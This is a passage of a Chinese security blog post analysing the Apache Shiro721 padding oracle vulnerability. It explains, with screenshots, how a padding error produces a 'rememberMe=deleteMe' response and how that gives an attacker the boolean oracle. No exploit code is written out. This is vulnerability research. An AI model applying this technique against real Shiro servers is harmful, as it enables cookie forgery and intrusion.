+<h4 id="在-shiro721-中的-Padding-Oracle-Attack"><a href="#在-shiro721-中的-Padding-Oracle-Attack" class="headerlink" title="在 shiro721 中的 Padding Oracle Attack"></a>在 shiro721 中的 Padding Oracle Attack</h4><p>要成功进行 Padding Oracle Attack 是需要服务端返回两个不同的响应特征来进行 Bool 判断的。</p>
+<p>在 Apache Shiro 的场景中，这个服务端的两个不同的响应特征为：</p>
+<ul>
+<li>Padding Oracle 错误时，服务端响应报文的 Set-Cookie 头字段返回 <code>rememberMe=deleteMe</code>；</li>
+<li>Padding Oracle 正确时，服务端返回正常的响应报文内容；</li>
+</ul>
+<p>我们可以通过响应头来判断明文填充是否正确，进而爆破出中间值。那么对于解密不正确的 Cookie，Shiro 是怎么处理的呢？</p>
+<h5 id="Padding-错误处理"><a href="#Padding-错误处理" class="headerlink" title="Padding 错误处理"></a>Padding 错误处理</h5><p>解密函数在 <code>org.apache.shiro.mgt.AbstractRememberMeManager#decrypt()</code> 中</p>
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/decrypt.png" class="">
+
+<p>跟进 <code>cipherService.decrypt()</code>，最后到 <code>crypt()</code> 中调用 <code>doFinal()</code> 方法</p>
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/crypt.png" class="">
+
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/doFinal.png" class="">
+
+<p><code>doFinal()</code> 方法有 <code>IllegalBlockSizeException</code>和<code>BadPaddingException</code> 这两个异常，分别用于捕获块大小异常和填充错误异常。异常会被抛出到 <code>crypt()</code> 方法中，最终被 <code>getRememberedPrincipals()</code> 方法捕获，并执行 <code>onRememberedPrincipalFailure()</code> 方法。</p>
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/onRememberedPrincipalFailure.png" class="">
+
+<p><code>onRememberedPrincipalFailure()</code> 方法调用了 <code>forgetIdentity()</code>。在 Shiro550 中我们分析过，该方法会调用 <code>removeFrom()</code>，并且会在response头部添加字段 <code>Set-Cookie: rememberMe=deleteMe</code></p>
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/forgetIdentity.png" class="">
+
+<p>倘若Padding结果不正确的话，响应包就会返回 <code>Set-Cookie: rememberMe=deleteMe</code> 。</p>
+<h5 id="Padding正确，反序列化处理"><a href="#Padding正确，反序列化处理" class="headerlink" title="Padding正确，反序列化处理"></a>Padding正确，反序列化处理</h5><p>CBC模式下的分组密码，如果某一组的密文被破坏，那么在其之后的分组都会受到影响。这时候我们的密文就无法正确的被反序列化了。</p>
+<p>Shiro中关于反序列化的处理在 <code>org.apache.shiro.io.DefaultSerializer#deserialize()</code> 方法下</p>
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/deserialize.png" class="">
+
+<p>如果反序列化的结果错误，则会抛出异常。最后异常仍会被 <code>getRememberedPrincipals()</code> 方法处理。这也就是上面讲的 response 包里会回显 302 且 <code>rememberMe=deleteMe</code></p>
+<p>但是对于 Java 来说，反序列化是以 Stream 的方式按顺序进行的，向其后添加或更改一些字符串并不会影响正常反序列化。我们可以来测试一下。</p>
+<p>我们获取正常用户的 Cookie 并使用密钥解密，可以看到最后填充的数据为 <code>0x0B</code></p>
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/addTails.png" class="">
+
+<p>下面我们将其更改为其他合法填充方式，然后加密发送出去</p>
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/changingPaddings.png" class="">
+
+<img src="/2023/03/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8702-Shiro721%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/SendDecrypt.png" class="">
+
+<p>服务器端正常响应，于是这里就构造出了布尔条件</p>
+<ul>
+<li>Padding 正确，服务器正常响应</li>
+<li>Padding 错误，服务器返回 <code>Set-Cookie: rememberMe=deleteMe</code></li>
+</ul>
+<h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>感觉从利用上来说并不算是一个很好打的漏洞，不过还是拓展了一条 CBC 攻击的路线。</p>
+<h2 id="0x06-Reference"><a href="#0x06-Reference" class="headerlink" title="0x06 Reference"></a>0x06 Reference</h2><p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89/">https://www.mi1k7ea.com/2020/10/14/%E6%B5%85%E6%9E%90Shiro-Padding-Oracle-Attack%EF%BC%88Shiro721%EF%BC%89/</a><br><a target="_blank" rel="noopener" href="https://goodapple.top/archives/261">https://goodapple.top/archives/261</a></p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">Java反序列化Shiro篇02-Shiro721流程分析</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">Drunkbaby</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2023-03-08 21:43:04</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2023/03/08/Java反序列化Shiro篇02-Shiro721流程分析/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Java/">#Java</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2023/03/13/golang-%E9%87%8D%E6%9E%84-sqlmap/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">golang 重构 sqlmap</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/03/08/HTB-%E9%9D%B6%E6%9C%BA-Precious/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">HTB 靶机 Precious</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;评论
+    </div>
+    
+        
+            
+
+    <div class="valine-container">
+        <script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script data-pjax>
+          function loadValine() {
+
+            const config = {
+              el: '#vcomments',
+              appId: 'mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va',
+              appKey: 'ermlV1eoB1YODT088EdXjo6C',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: 'just go go',
+              lang: 'zh-CN'.toLowerCase()
+            }
+
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            new Valine(config)
+
+            function getAuthor(language) {
+              switch (language) {
+                case 'en':
+                  return 'Author'
+                case 'zh-CN':
+                  return '博主'
+                default:
+                  return 'Master'
+              }
+            }
+
+            // Add "Author" identify
+            const getValineDomTimer = setInterval(() => {
+              const vcards = document.querySelectorAll('#vcomments .vcards .vcard')
+              if (vcards.length > 0) {
+                let author = 'Drunkbaby'
+
+                if (author) {
+                  for (let vcard of vcards) {
+                    const vnick_dom = vcard.querySelector('.vhead .vnick')
+                    const vnick = vnick_dom.innerHTML
+                    if (vnick === author) {
+                      vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                    }
+                  }
+                }
+                clearInterval(getValineDomTimer)
+              } else {
+                clearInterval(getValineDomTimer)
+              }
+            }, 2000)
+          }
+
+          if ('true' === 'true') {
+            const loadValineTimeout = setTimeout(() => {
+              loadValine()
+              clearTimeout(loadValineTimeout)
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadValine)
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">0x02 环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">0x03 漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6"><span class="nav-text">漏洞利用前提条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">0x04 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Padding-Oracle-Attack-%E6%9E%84%E9%80%A0%E5%8A%A0%E5%AF%86%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90"><span class="nav-text">Padding Oracle Attack 构造加密数据分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">漏洞代码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90"><span class="nav-text">密钥生成</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%A8-shiro721-%E4%B8%AD%E7%9A%84-Padding-Oracle-Attack"><span class="nav-text">在 shiro721 中的 Padding Oracle Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Padding-%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86"><span class="nav-text">Padding 错误处理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Padding%E6%AD%A3%E7%A1%AE%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%84%E7%90%86"><span class="nav-text">Padding正确，反序列化处理</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E5%B0%8F%E7%BB%93"><span class="nav-text">0x05 小结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-Reference"><span class="nav-text">0x06 Reference</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2021</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">Drunkbaby</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
